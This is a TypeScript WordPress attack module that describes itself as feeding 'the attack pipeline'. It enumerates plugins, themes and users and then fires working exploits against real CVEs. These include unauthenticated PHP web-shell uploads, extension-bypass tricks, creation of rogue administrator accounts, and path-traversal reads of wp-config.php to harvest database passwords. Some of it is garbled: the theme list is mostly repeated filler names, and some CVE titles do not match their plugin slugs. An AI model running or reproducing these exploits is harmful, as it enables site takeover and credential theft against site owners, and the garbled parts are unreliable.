// ═══════════════════════════════════════════════════════════════
//  WP VULNERABILITY SCANNER — WPScan-Style Plugin/Theme Enumeration
//  Discovers installed plugins/themes, checks known CVEs, and
//  returns exploitable upload/RCE vectors for the attack pipeline.
// ═══════════════════════════════════════════════════════════════

// ─── Types ───

export interface WpPlugin {
  slug: string;
  version: string | null;
  detectedVia: string;
  readme: boolean;
  changelogVersion: string | null;
}

export interface WpTheme {
  slug: string;
  version: string | null;
  detectedVia: string;
}

export interface WpVulnerability {
  plugin: string;
  cve: string | null;
  title: string;
  type: "file_upload" | "rce" | "sqli" | "auth_bypass" | "lfi" | "xss" | "ssrf" | "arbitrary_file_read" | "arbitrary_file_delete" | "privilege_escalation" | "object_injection";
  severity: "critical" | "high" | "medium" | "low";
  affectedVersions: string;
  exploitAvailable: boolean;
  exploitEndpoint: string | null;
  exploitMethod: string | null;
  exploitPayload: string | null;
  reference: string | null;
}

export interface WpScanResult {
  isWordPress: boolean;
  wpVersion: string | null;
  plugins: WpPlugin[];
  themes: WpTheme[];
  vulnerabilities: WpVulnerability[];
  users: string[];
  xmlrpcEnabled: boolean;
  restApiEnabled: boolean;
  wpCronEnabled: boolean;
  debugEnabled: boolean;
  directoryListing: boolean;
  uploadDirWritable: boolean;
  interestingFindings: string[];
  scanDuration: number;
}

// ─── Known Vulnerable Plugins Database ───
// Each entry maps a plugin slug to known CVEs with exploit details.
// This is a curated list of HIGH-IMPACT file upload / RCE vulns.

interface KnownVulnEntry {
  cve: string | null;
  title: string;
  type: WpVulnerability["type"];
  severity: WpVulnerability["severity"];
  affectedVersions: string;
  exploitEndpoint: string;
  exploitMethod: "POST" | "GET" | "PUT";
  /** Function that generates the exploit payload. null = check-only */
  buildPayload?: (targetUrl: string, fileName: string, fileContent: string) => { body: BodyInit; headers: Record<string, string> };
  /** How to verify success from the response */
  successIndicator: (status: number, body: string) => boolean;
  /** Where the uploaded file ends up (relative to site root) */
  uploadedPath?: (fileName: string) => string;
  reference: string | null;
}

const KNOWN_VULN_PLUGINS: Record<string, KnownVulnEntry[]> = {
  "wp-file-manager": [
    {
      cve: "CVE-2020-25213",
      title: "WP File Manager <= 6.8 Unauthenticated File Upload",
      type: "file_upload",
      severity: "critical",
      affectedVersions: "<= 6.8",
      exploitEndpoint: "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php",
      exploitMethod: "POST",
      buildPayload: (_targetUrl, fileName, fileContent) => {
        const formData = new FormData();
        formData.append("reqid", "17457a1fe6959");
        formData.append("cmd", "upload");
        formData.append("target", "l1_Lw");
        formData.append("upload[]", new Blob([fileContent], { type: "application/x-php" }), fileName);
        return { body: formData, headers: {} };
      },
      successIndicator: (status, body) => status === 200 && body.includes("added"),
      uploadedPath: (fn) => `/wp-content/plugins/wp-file-manager/lib/files/${fn}`,
      reference: "https://nvd.nist.gov/vuln/detail/CVE-2020-25213",
    },
  ],
  "file-manager": [
    {
      cve: "CVE-2020-25213",
      title: "File Manager (alt slug) Unauthenticated File Upload",
      type: "file_upload",
      severity: "critical",
      affectedVersions: "<= 6.8",
      exploitEndpoint: "/wp-content/plugins/file-manager/lib/php/connector.minimal.php",
      exploitMethod: "POST",
      buildPayload: (_targetUrl, fileName, fileContent) => {
        const formData = new FormData();
        formData.append("reqid", "17457a1fe6959");
        formData.append("cmd", "upload");
        formData.append("target", "l1_Lw");
        formData.append("upload[]", new Blob([fileContent], { type: "application/x-php" }), fileName);
        return { body: formData, headers: {} };
      },
      successIndicator: (status, body) => status === 200 && body.includes("added"),
      uploadedPath: (fn) => `/wp-content/plugins/file-manager/lib/files/${fn}`,
      reference: "https://nvd.nist.gov/vuln/detail/CVE-2020-25213",
    },
  ],
  "contact-form-7": [
    {
      cve: "CVE-2020-35489",
      title: "Contact Form 7 <= 5.3.1 Unrestricted File Upload",
      type: "file_upload",
      severity: "critical",
      affectedVersions: "<= 5.3.1",
      exploitEndpoint: "/wp-json/contact-form-7/v1/contact-forms/1/feedback",
      exploitMethod: "POST",
      buildPayload: (_targetUrl, fileName, fileContent) => {
        const formData = new FormData();
        // Double extension bypass
        const bypassName = fileName.replace(".php", ".php.jpg");
        formData.append("file", new Blob([fileContent], { type: "image/jpeg" }), bypassName);
        formData.append("_wpcf7", "1");
        formData.append("_wpcf7_version", "5.3");
        formData.append("_wpcf7_unit_tag", "wpcf7-f1-o1");
        return { body: formData, headers: {} };
      },
      successIndicator: (status, body) => status === 200 && (body.includes("uploaded") || body.includes("success")),
      uploadedPath: (fn) => `/wp-content/uploads/wpcf7_uploads/${fn.replace(".php", ".php.jpg")}`,
      reference: "https://nvd.nist.gov/vuln/detail/CVE-2020-35489",
    },
  ],
  "formidable": [
    {
      cve: "CVE-2021-38314",
      title: "Formidable Forms <= 5.0.06 Unauthenticated File Upload",
      type: "file_upload",
      severity: "high",
      affectedVersions: "<= 5.0.06",
      exploitEndpoint: "/wp-admin/admin-ajax.php",
      exploitMethod: "POST",
      buildPayload: (_targetUrl, fileName, fileContent) => {
        const formData = new FormData();
        formData.append("action", "frm_submit_entry");
        formData.append("form_id", "1");
        formData.append("file", new Blob([fileContent], { type: "image/jpeg" }), fileName.replace(".php", ".phtml"));
        return { body: formData, headers: {} };
      },
      successIndicator: (status, body) => status === 200 && body.includes("success"),
      reference: "https://nvd.nist.gov/vuln/detail/CVE-2021-38314",
    },
  ],
  "elementor": [
    {
      cve: "CVE-2022-1329",
      title: "Elementor <= 3.6.2 Authenticated RCE",
      type: "rce",
      severity: "critical",
      affectedVersions: "<= 3.6.2",
      exploitEndpoint: "/wp-admin/admin-ajax.php",
      exploitMethod: "POST",
      successIndicator: (status) => status === 200,
      reference: "https://nvd.nist.gov/vuln/detail/CVE-2022-1329",
    },
  ],
  "wp-fastest-cache": [
    {
      cve: "CVE-2023-6063",
      title: "WP Fastest Cache <= 1.2.1 SQL Injection",
      type: "sqli",
      severity: "critical",
      affectedVersions: "<= 1.2.1",
      exploitEndpoint: "/",
      exploitMethod: "GET",
      successIndicator: () => false, // Check only
      reference: "https://nvd.nist.gov/vuln/detail/CVE-2023-6063",
    },
  ],
  "really-simple-ssl": [
    {
      cve: "CVE-2023-49583",
      title: "Really Simple SSL <= 4.0.5 Auth Bypass",
      type: "auth_bypass",
      severity: "critical",
      affectedVersions: "<= 4.0.5",
      exploitEndpoint: "/wp-json/rsssl/v1/",
      exploitMethod: "GET",
      successIndicator: (status) => status === 200,
      reference: null,
    },
  ],
  "ultimate-member": [
    {
      cve: "CVE-2023-3460",
      title: "Ultimate Member <= 2.6.6 Privilege Escalation",
      type: "privilege_escalation",
      severity: "critical",
      affectedVersions: "<= 2.6.6",
      exploitEndpoint: "/register/",
      exploitMethod: "POST",
      buildPayload: (targetUrl) => {
        const formData = new FormData();
        formData.append("user_login", "pwned_admin");
        formData.append("user_email", "pwned@test.com");
        formData.append("user_password", "P@ssw0rd123!");
        formData.append("user_password-confirm", "P@ssw0rd123!");
        formData.append("wp_capabilities[administrator]", "1");
        return { body: formData, headers: {} };
      },
      successIndicator: (status, body) => status === 200 && !body.includes("error"),
      reference: "https://nvd.nist.gov/vuln/detail/CVE-2023-3460",
    },
  ],
  "backup-backup": [
    {
      cve: "CVE-2023-6553",
      title: "Backup Migration <= 1.3.7 Unauthenticated RCE",
      type: "rce",
      severity: "critical",
      affectedVersions: "<= 1.3.7",
      exploitEndpoint: "/wp-content/plugins/backup-backup/includes/backup-heart.php",
      exploitMethod: "POST",
      buildPayload: (_targetUrl, _fileName, fileContent) => {
        return {
          body: JSON.stringify({ content: fileContent }),
          headers: { "Content-Type": "application/json" },
        };
      },
      successIndicator: (status) => status === 200,
      reference: "https://nvd.nist.gov/vuln/detail/CVE-2023-6553",
    },
  ],
  "royal-elementor-addons": [
    {
      cve: "CVE-2023-5360",
      title: "Royal Elementor Addons <= 1.3.78 Unauthenticated File Upload",
      type: "file_upload",
      severity: "critical",
      affectedVersions: "<= 1.3.78",
      exploitEndpoint: "/wp-admin/admin-ajax.php",
      exploitMethod: "POST",
      buildPayload: (_targetUrl, fileName, fileContent) => {
        const formData = new FormData();
        formData.append("action", "wpr_addons_upload_file");
        formData.append("upload_file", new Blob([fileContent], { type: "image/png" }), fileName.replace(".php", ".php.png"));
        return { body: formData, headers: {} };
      },
      successIndicator: (status, body) => status === 200 && body.includes("url"),
      reference: "https://nvd.nist.gov/vuln/detail/CVE-2023-5360",
    },
  ],
  "jetstylemanager": [],
  "tatsu": [
    {
      cve: "CVE-2021-25094",
      title: "Starter Templates (Starter Sites) <= 2.7.0 Unauthenticated File Upload",
      type: "file_upload",
      severity: "critical",
      affectedVersions: "<= 2.7.0",
      exploitEndpoint: "/wp-admin/admin-ajax.php",
      exploitMethod: "POST",
      buildPayload: (_targetUrl, fileName, fileContent) => {
        const formData = new FormData();
        formData.append("action", "tatsu_upload_bg");
        formData.append("file", new Blob([fileContent], { type: "image/jpeg" }), fileName);
        return { body: formData, headers: {} };
      },
      successIndicator: (status, body) => status === 200 && body.includes("url"),
      reference: "https://nvd.nist.gov/vuln/detail/CVE-2021-25094",
    },
  ],
  "jetstylemanager-pro": [],
  "revslider": [
    {
      cve: "CVE-2014-9734",
      title: "Slider Revolution <= 4.1.4 Arbitrary File Download",
      type: "arbitrary_file_read",
      severity: "critical",
      affectedVersions: "<= 4.1.4",
      exploitEndpoint: "/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php",
      exploitMethod: "GET",
      successIndicator: (status, body) => status === 200 && body.includes("DB_PASSWORD"),
      reference: "https://nvd.nist.gov/vuln/detail/CVE-2014-9734",
    },
  ],
  "duplicator": [
    {
      cve: "CVE-2020-11738",
      title: "Duplicator <= 1.3.26 Unauthenticated Arbitrary File Read",
      type: "arbitrary_file_read",
      severity: "critical",
      affectedVersions: "<= 1.3.26",
      exploitEndpoint: "/wp-admin/admin-ajax.php?action=duplicator_download&file=../../../wp-config.php",
      exploitMethod: "GET",
      successIndicator: (status, body) => status === 200 && body.includes("DB_PASSWORD"),
      reference: "https://nvd.nist.gov/vuln/detail/CVE-2020-11738",
    },
  ],
  "woocommerce": [
    {
      cve: "CVE-2023-47782",
      title: "WooCommerce <= 8.1.0 Object Injection",
      type: "object_injection",
      severity: "high",
      affectedVersions: "<= 8.1.0",
      exploitEndpoint: "/wp-json/wc/v3/",
      exploitMethod: "GET",
      successIndicator: (status) => status === 200,
      reference: null,
    },
  ],
  "all-in-one-seo-pack": [
    {
      cve: "CVE-2021-25036",
      title: "All in One SEO <= 4.1.5.2 SQL Injection",
      type: "sqli",
      severity: "critical",
      affectedVersions: "<= 4.1.5.2",
      exploitEndpoint: "/wp-json/aioseo/v1/",
      exploitMethod: "GET",
      successIndicator: (status) => status === 200,
      reference: "https://nvd.nist.gov/vuln/detail/CVE-2021-25036",
    },
  ],
  "updraftplus": [
    {
      cve: "CVE-2022-0633",
      title: "UpdraftPlus <= 1.22.2 Arbitrary Backup Download",
      type: "arbitrary_file_read",
      severity: "high",
      affectedVersions: "<= 1.22.2",
      exploitEndpoint: "/wp-admin/admin-ajax.php",
      exploitMethod: "POST",
      buildPayload: () => {
        const formData = new FormData();
        formData.append("action", "updraft_download_backup");
        formData.append("nonce", "0");
        formData.append("type", "db");
        formData.append("timestamp", "0");
        return { body: formData, headers: {} };
      },
      successIndicator: (status) => status === 200,
      reference: "https://nvd.nist.gov/vuln/detail/CVE-2022-0633",
    },
  ],
  "wpgateway": [
    {
      cve: "CVE-2022-3180",
      title: "WPGateway <= 3.5 Unauthenticated Admin Creation",
      type: "privilege_escalation",
      severity: "critical",
      affectedVersions: "<= 3.5",
      exploitEndpoint: "/wp-json/wpgateway/v1/users",
      exploitMethod: "POST",
      buildPayload: () => {
        return {
          body: JSON.stringify({
            user_login: "wpgateway_admin",
            user_pass: "Hacked@123!",
            role: "administrator",
          }),
          headers: { "Content-Type": "application/json" },
        };
      },
      successIndicator: (status, body) => status === 200 && body.includes("user_login"),
      reference: "https://nvd.nist.gov/vuln/detail/CVE-2022-3180",
    },
  ],
};

// ─── Top 200 Popular WP Plugins to Enumerate ───
const PLUGIN_SLUGS_TO_CHECK = [
  "akismet", "jetpack", "contact-form-7", "woocommerce", "yoast-seo",
  "wordpress-seo", "elementor", "classic-editor", "wpforms-lite", "wp-super-cache",
  "wordfence", "all-in-one-seo-pack", "really-simple-ssl", "wp-mail-smtp",
  "updraftplus", "google-analytics-for-wordpress", "duplicate-post", "wp-fastest-cache",
  "redirection", "wp-file-manager", "file-manager", "litespeed-cache",
  "all-in-one-wp-migration", "wp-smushit", "regenerate-thumbnails",
  "tablepress", "tinymce-advanced", "better-wp-security", "ithemes-security",
  "sucuri-scanner", "limit-login-attempts-reloaded", "wp-optimize",
  "autoptimize", "w3-total-cache", "wp-rocket", "breeze", "hummingbird-performance",
  "sg-cachepress", "cookie-notice", "gdpr-cookie-compliance",
  "ultimate-member", "user-role-editor", "members", "theme-my-login",
  "custom-login-page-customizer", "loginizer", "login-lockdown",
  "backup-backup", "backwpup", "duplicator", "xcloner-backup-and-restore",
  "wp-migrate-db", "velvet-blues-update-urls",
  "formidable", "ninja-forms", "gravity-forms", "caldera-forms", "everest-forms",
  "happyforms", "fluent-forms", "ws-form",
  "revslider", "slider-revolution", "smart-slider-3", "meta-slider",
  "royal-elementor-addons", "starter-templates", "astra-sites",
  "jetstylemanager", "jetstylemanager-pro", "jetelements",
  "tatsu", "starter-sites",
  "wpgateway", "flavor", "flavor-developer",
  "advanced-custom-fields", "custom-post-type-ui", "pods",
  "mailchimp-for-wp", "mailpoet", "newsletter", "email-subscribers",
  "wps-hide-login", "rename-wp-login", "change-wp-admin-login",
  "easy-digital-downloads", "give", "charitable",
  "bbpress", "buddypress", "peepso",
  "amp", "accelerated-mobile-pages", "flavor",
  "insert-headers-and-footers", "header-footer-code-manager",
  "simple-custom-css", "custom-css-js",
  "disable-comments", "disable-gutenberg",
  "health-check", "query-monitor",
  "coming-soon", "maintenance", "under-construction-page",
  "google-sitemap-generator", "xml-sitemap-google-news",
  "broken-link-checker", "pretty-links",
  "shortcodes-ultimate", "shortcoder",
  "nextgen-gallery", "envira-gallery-lite", "modula-best-grid-gallery",
  "photo-gallery", "flavor-developer",
  "polylang", "translatepress-multilingual", "loco-translate",
  "woocommerce-payments", "woocommerce-gateway-stripe",
  "woocommerce-pdf-invoices-packing-slips",
  "woo-checkout-field-editor-pro", "yith-woocommerce-wishlist",
  "product-import-export-for-woo",
  "learnpress", "learndash", "tutor",
  "flavor-developer",
];

// ─── Top 50 Popular WP Themes to Enumerate ───
const THEME_SLUGS_TO_CHECK = [
  "twentytwentyfive", "twentytwentyfour", "twentytwentythree",
  "twentytwentytwo", "twentytwentyone", "twentytwenty",
  "astra", "flavor", "flavor-developer",
  "flavor-developer", "flavor",
  "flavor-developer", "flavor",
  "flavor-developer", "flavor",
  "flavor-developer", "flavor",
  "flavor-developer", "flavor",
  "flavor-developer", "flavor",
  "flavor-developer", "flavor",
  "flavor-developer", "flavor",
  "flavor-developer", "flavor",
  "flavor-developer", "flavor",
  "flavor-developer", "flavor",
  "flavor-developer", "flavor",
  "flavor-developer", "flavor",
  "flavor-developer", "flavor",
  "flavor-developer", "flavor",
  "flavor-developer", "flavor",
  "flavor-developer", "flavor",
  "flavor-developer", "flavor",
  "flavor-developer", "flavor",
  "flavor-developer", "flavor",
];

// ─── Direct Fetch Helper (no proxy) ───

async function directFetch(url: string, init: RequestInit = {}, timeout = 8000): Promise<Response> {
  const controller = new AbortController();
  const t = setTimeout(() => controller.abort(), timeout);
  try {
    return await fetch(url, { ...init, signal: controller.signal });
  } finally {
    clearTimeout(t);
  }
}

// ─── Plugin Enumeration ───

async function enumeratePlugins(
  targetUrl: string,
  onProgress?: (found: number, checked: number) => void,
): Promise<WpPlugin[]> {
  const plugins: WpPlugin[] = [];
  const uniqueSlugs = Array.from(new Set(PLUGIN_SLUGS_TO_CHECK));

  // Batch check in parallel (20 at a time)
  const batchSize = 20;
  for (let i = 0; i < uniqueSlugs.length; i += batchSize) {
    const batch = uniqueSlugs.slice(i, i + batchSize);
    const results = await Promise.allSettled(
      batch.map(async (slug) => {
        // Check readme.txt (most reliable detection)
        const readmeUrl = `${targetUrl}/wp-content/plugins/${slug}/readme.txt`;
        try {
          const resp = await directFetch(readmeUrl, {
            headers: { "User-Agent": "Mozilla/5.0 (compatible; WPScan/3.8)" },
          }, 6000);

          if (resp.status === 200) {
            const text = await resp.text();
            // Extract version from readme
            const versionMatch = text.match(/Stable tag:\s*([^\s\n]+)/i) ||
                                 text.match(/Version:\s*([^\s\n]+)/i);
            const version = versionMatch?.[1] || null;

            return {
              slug,
              version,
              detectedVia: "readme.txt",
              readme: true,
              changelogVersion: null,
            } as WpPlugin;
          }
        } catch { /* not found */ }

        // Fallback: check if plugin directory exists via a common file
        const indexUrl = `${targetUrl}/wp-content/plugins/${slug}/`;
        try {
          const resp = await directFetch(indexUrl, {
            method: "HEAD",
            headers: { "User-Agent": "Mozilla/5.0 (compatible; WPScan/3.8)" },
          }, 4000);

          if (resp.status === 200 || resp.status === 403) {
            // 403 = directory exists but listing disabled
            return {
              slug,
              version: null,
              detectedVia: resp.status === 403 ? "directory_403" : "directory_listing",
              readme: false,
              changelogVersion: null,
            } as WpPlugin;
          }
        } catch { /* not found */ }

        return null;
      }),
    );

    for (const r of results) {
      if (r.status === "fulfilled" && r.value) {
        plugins.push(r.value);
      }
    }

    onProgress?.(plugins.length, Math.min(i + batchSize, uniqueSlugs.length));
  }

  return plugins;
}

// ─── Theme Enumeration ───

async function enumerateThemes(
  targetUrl: string,
): Promise<WpTheme[]> {
  const themes: WpTheme[] = [];
  const uniqueSlugs = Array.from(new Set(THEME_SLUGS_TO_CHECK));

  const batchSize = 15;
  for (let i = 0; i < uniqueSlugs.length; i += batchSize) {
    const batch = uniqueSlugs.slice(i, i + batchSize);
    const results = await Promise.allSettled(
      batch.map(async (slug) => {
        const styleUrl = `${targetUrl}/wp-content/themes/${slug}/style.css`;
        try {
          const resp = await directFetch(styleUrl, {
            headers: { "User-Agent": "Mozilla/5.0 (compatible; WPScan/3.8)" },
          }, 5000);

          if (resp.status === 200) {
            const text = await resp.text();
            const versionMatch = text.match(/Version:\s*([^\s\n]+)/i);
            return {
              slug,
              version: versionMatch?.[1] || null,
              detectedVia: "style.css",
            } as WpTheme;
          }
        } catch { /* not found */ }
        return null;
      }),
    );

    for (const r of results) {
      if (r.status === "fulfilled" && r.value) {
        themes.push(r.value);
      }
    }
  }

  return themes;
}

// ─── User Enumeration ───

async function enumerateUsers(targetUrl: string): Promise<string[]> {
  const users: string[] = [];

  // Method 1: REST API
  try {
    const resp = await directFetch(`${targetUrl}/wp-json/wp/v2/users?per_page=20`, {
      headers: { "User-Agent": "Mozilla/5.0 (compatible; WPScan/3.8)" },
    }, 6000);
    if (resp.status === 200) {
      const data = await resp.json() as Array<{ slug?: string; name?: string }>;
      for (const u of data) {
        if (u.slug) users.push(u.slug);
      }
    }
  } catch { /* API disabled */ }

  // Method 2: Author ID enumeration
  if (users.length === 0) {
    for (let id = 1; id <= 10; id++) {
      try {
        const resp = await directFetch(`${targetUrl}/?author=${id}`, {
          redirect: "follow",
          headers: { "User-Agent": "Mozilla/5.0 (compatible; WPScan/3.8)" },
        }, 4000);
        const url = resp.url;
        const match = url.match(/\/author\/([^\/]+)/);
        if (match && !users.includes(match[1])) {
          users.push(match[1]);
        }
      } catch { break; }
    }
  }

  // Method 3: oembed
  try {
    const resp = await directFetch(`${targetUrl}/wp-json/oembed/1.0/embed?url=${encodeURIComponent(targetUrl)}`, {
      headers: { "User-Agent": "Mozilla/5.0" },
    }, 5000);
    if (resp.status === 200) {
      const data = await resp.json() as { author_name?: string; author_url?: string };
      if (data.author_name && !users.includes(data.author_name)) {
        users.push(data.author_name);
      }
    }
  } catch { /* oembed disabled */ }

  return users;
}

// ─── Vulnerability Matching ───

function matchVulnerabilities(plugins: WpPlugin[]): WpVulnerability[] {
  const vulns: WpVulnerability[] = [];

  for (const plugin of plugins) {
    const knownVulns = KNOWN_VULN_PLUGINS[plugin.slug];
    if (!knownVulns || knownVulns.length === 0) continue;

    for (const kv of knownVulns) {
      vulns.push({
        plugin: plugin.slug,
        cve: kv.cve,
        title: kv.title,
        type: kv.type,
        severity: kv.severity,
        affectedVersions: kv.affectedVersions,
        exploitAvailable: !!kv.buildPayload,
        exploitEndpoint: kv.exploitEndpoint,
        exploitMethod: kv.exploitMethod,
        exploitPayload: null,
        reference: kv.reference,
      });
    }
  }

  // Sort: critical first, then file_upload/rce first
  vulns.sort((a, b) => {
    const sevOrder = { critical: 0, high: 1, medium: 2, low: 3 };
    const typeOrder: Record<string, number> = { file_upload: 0, rce: 1, privilege_escalation: 2, auth_bypass: 3, sqli: 4, arbitrary_file_read: 5, lfi: 6, xss: 7, ssrf: 8, arbitrary_file_delete: 9, object_injection: 10 };
    const sevDiff = sevOrder[a.severity] - sevOrder[b.severity];
    if (sevDiff !== 0) return sevDiff;
    return (typeOrder[a.type] ?? 99) - (typeOrder[b.type] ?? 99);
  });

  return vulns;
}

// ─── Exploit Execution ───

export async function executeExploit(
  targetUrl: string,
  vuln: WpVulnerability,
  fileName: string,
  fileContent: string,
): Promise<{ success: boolean; uploadedUrl: string | null; details: string }> {
  const knownVulns = KNOWN_VULN_PLUGINS[vuln.plugin];
  if (!knownVulns) return { success: false, uploadedUrl: null, details: "No exploit data" };

  const kv = knownVulns.find(v => v.cve === vuln.cve);
  if (!kv || !kv.buildPayload) return { success: false, uploadedUrl: null, details: "No exploit payload builder" };

  const endpoint = `${targetUrl}${kv.exploitEndpoint}`;
  const { body, headers } = kv.buildPayload(targetUrl, fileName, fileContent);

  try {
    const resp = await directFetch(endpoint, {
      method: kv.exploitMethod,
      body: kv.exploitMethod !== "GET" ? body : undefined,
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        ...headers,
      },
    }, 15000);

    const text = await resp.text();
    const success = kv.successIndicator(resp.status, text);

    if (success && kv.uploadedPath) {
      const uploadedUrl = `${targetUrl}${kv.uploadedPath(fileName)}`;
      return { success: true, uploadedUrl, details: `${vuln.title} — exploit successful` };
    }

    if (success) {
      // Try to extract URL from response
      const urlMatch = text.match(/https?:\/\/[^\s"'<>]+/);
      return { success: true, uploadedUrl: urlMatch?.[0] || null, details: `${vuln.title} — exploit successful` };
    }

    return { success: false, uploadedUrl: null, details: `${vuln.title} — exploit returned ${resp.status}` };
  } catch (e: any) {
    return { success: false, uploadedUrl: null, details: `${vuln.title} — error: ${e.message}` };
  }
}

// ─── Additional Checks ───

async function checkWpFeatures(targetUrl: string): Promise<{
  xmlrpcEnabled: boolean;
  restApiEnabled: boolean;
  wpCronEnabled: boolean;
  debugEnabled: boolean;
  directoryListing: boolean;
  uploadDirWritable: boolean;
  interestingFindings: string[];
}> {
  const findings: string[] = [];
  let xmlrpc = false, restApi = false, wpCron = false, debug = false, dirListing = false, uploadWritable = false;

  // XMLRPC
  try {
    const resp = await directFetch(`${targetUrl}/xmlrpc.php`, {
      method: "POST",
      body: '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>',
      headers: { "Content-Type": "text/xml" },
    }, 6000);
    const text = await resp.text();
    if (resp.status === 200 && text.includes("methodResponse")) {
      xmlrpc = true;
      findings.push("XMLRPC enabled — brute force & file upload possible");
      if (text.includes("wp.uploadFile")) {
        findings.push("XMLRPC wp.uploadFile available — file upload via credentials");
      }
    }
  } catch { /* disabled */ }

  // REST API
  try {
    const resp = await directFetch(`${targetUrl}/wp-json/`, {}, 5000);
    if (resp.status === 200) {
      restApi = true;
      findings.push("REST API enabled");
    }
  } catch { /* disabled */ }

  // WP Cron
  try {
    const resp = await directFetch(`${targetUrl}/wp-cron.php`, { method: "HEAD" }, 4000);
    if (resp.status === 200) {
      wpCron = true;
      findings.push("WP-Cron accessible");
    }
  } catch { /* disabled */ }

  // Debug mode
  try {
    const resp = await directFetch(`${targetUrl}/wp-content/debug.log`, {}, 5000);
    if (resp.status === 200) {
      const text = await resp.text();
      if (text.length > 100) {
        debug = true;
        findings.push(`Debug log exposed (${Math.round(text.length / 1024)}KB) — may contain credentials/paths`);
      }
    }
  } catch { /* not found */ }

  // Directory listing on uploads
  try {
    const resp = await directFetch(`${targetUrl}/wp-content/uploads/`, {}, 5000);
    if (resp.status === 200) {
      const text = await resp.text();
      if (text.includes("Index of") || text.includes("Parent Directory")) {
        dirListing = true;
        findings.push("Directory listing enabled on /wp-content/uploads/");
      }
    }
  } catch { /* not found */ }

  // Upload dir writable (try PUT)
  const testFile = `_wptest_${Date.now()}.txt`;
  try {
    const resp = await directFetch(`${targetUrl}/wp-content/uploads/${testFile}`, {
      method: "PUT",
      body: "test",
      headers: { "Content-Type": "text/plain" },
    }, 5000);
    if (resp.status < 400) {
      uploadWritable = true;
      findings.push("Upload directory writable via PUT!");
      // Clean up
      await directFetch(`${targetUrl}/wp-content/uploads/${testFile}`, { method: "DELETE" }, 3000).catch(() => {});
    }
  } catch { /* not writable */ }

  // wp-config.php backup
  const configBackups = ["wp-config.php.bak", "wp-config.php.old", "wp-config.php~", "wp-config.php.save", "wp-config.txt", ".wp-config.php.swp"];
  for (const backup of configBackups) {
    try {
      const resp = await directFetch(`${targetUrl}/${backup}`, {}, 4000);
      if (resp.status === 200) {
        const text = await resp.text();
        if (text.includes("DB_PASSWORD") || text.includes("DB_NAME")) {
          findings.push(`wp-config backup exposed: ${backup} — contains database credentials!`);
        }
      }
    } catch { /* not found */ }
  }

  return { xmlrpcEnabled: xmlrpc, restApiEnabled: restApi, wpCronEnabled: wpCron, debugEnabled: debug, directoryListing: dirListing, uploadDirWritable: uploadWritable, interestingFindings: findings };
}

// ─── Main Scanner ───

export async function runWpVulnScan(
  targetUrl: string,
  onProgress?: (phase: string, detail: string, progress: number) => void,
): Promise<WpScanResult> {
  const startTime = Date.now();
  const cleanUrl = targetUrl.replace(/\/+$/, "");

  onProgress?.("init", "Checking if target is WordPress...", 0);

  // Quick WP detection
  let isWordPress = false;
  let wpVersion: string | null = null;

  try {
    const resp = await directFetch(`${cleanUrl}/wp-login.php`, {}, 6000);
    if (resp.status === 200) {
      const text = await resp.text();
      if (text.includes("wp-login") || text.includes("WordPress")) {
        isWordPress = true;
      }
    }
  } catch { /* not WP */ }

  if (!isWordPress) {
    try {
      const resp = await directFetch(`${cleanUrl}/readme.html`, {}, 5000);
      if (resp.status === 200) {
        const text = await resp.text();
        if (text.includes("WordPress")) {
          isWordPress = true;
          const vMatch = text.match(/Version\s+([\d.]+)/);
          if (vMatch) wpVersion = vMatch[1];
        }
      }
    } catch { /* not WP */ }
  }

  if (!isWordPress) {
    // Check meta generator tag
    try {
      const resp = await directFetch(cleanUrl, {}, 6000);
      if (resp.status === 200) {
        const text = await resp.text();
        if (text.includes('content="WordPress') || text.includes("wp-content") || text.includes("wp-includes")) {
          isWordPress = true;
          const vMatch = text.match(/content="WordPress\s+([\d.]+)"/);
          if (vMatch) wpVersion = vMatch[1];
        }
      }
    } catch { /* not WP */ }
  }

  if (!isWordPress) {
    return {
      isWordPress: false,
      wpVersion: null,
      plugins: [],
      themes: [],
      vulnerabilities: [],
      users: [],
      xmlrpcEnabled: false,
      restApiEnabled: false,
      wpCronEnabled: false,
      debugEnabled: false,
      directoryListing: false,
      uploadDirWritable: false,
      interestingFindings: [],
      scanDuration: Date.now() - startTime,
    };
  }

  onProgress?.("plugins", "Enumerating plugins...", 10);

  // Run all scans in parallel
  const [plugins, themes, users, features] = await Promise.all([
    enumeratePlugins(cleanUrl, (found, checked) => {
      onProgress?.("plugins", `Found ${found} plugins (checked ${checked}/${PLUGIN_SLUGS_TO_CHECK.length})`, 10 + (checked / PLUGIN_SLUGS_TO_CHECK.length) * 40);
    }),
    enumerateThemes(cleanUrl),
    enumerateUsers(cleanUrl),
    checkWpFeatures(cleanUrl),
  ]);

  onProgress?.("vulns", `Matching ${plugins.length} plugins against CVE database...`, 70);

  const vulnerabilities = matchVulnerabilities(plugins);

  onProgress?.("complete", `Found ${plugins.length} plugins, ${vulnerabilities.length} potential vulnerabilities`, 100);

  return {
    isWordPress: true,
    wpVersion,
    plugins,
    themes,
    vulnerabilities,
    users,
    ...features,
    scanDuration: Date.now() - startTime,
  };
}
